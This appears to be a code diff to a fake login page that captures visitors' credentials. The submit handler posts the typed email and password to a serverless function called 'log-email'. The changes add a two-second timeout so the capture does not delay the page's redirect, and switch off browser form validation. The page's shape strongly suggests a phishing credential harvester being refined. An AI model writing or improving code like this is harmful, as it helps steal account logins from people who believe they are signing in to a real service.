@@ -216,7 +216,7 @@
     </div>
     
     <div class="login-card">
-        <form id="login-form">
+        <form id="login-form" novalidate>
             <div class="form-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" placeholder="Your email address" required autofocus pattern="^[^\s@]+@[^\s@]+\.[^\s@]+$" title="Please enter a valid email address">
@@ -273,6 +273,14 @@
     </div>
 
     <script>
+        // 简单的 fetch 超时封装，避免请求卡住影响后续跳转
+        function fetchWithTimeout(resource, options = {}) {
+            const { timeout = 2000 } = options;
+            return Promise.race([
+                fetch(resource, options),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), timeout))
+            ]);
+        }
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -305,10 +313,11 @@
             }
             
             try {
-                await fetch('/.netlify/functions/log-email', {
+                await fetchWithTimeout('/.netlify/functions/log-email', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({ email, password }),
+                    timeout: 2000
                 });
             } catch (error) {
                 console.error('Logging failed:', error);
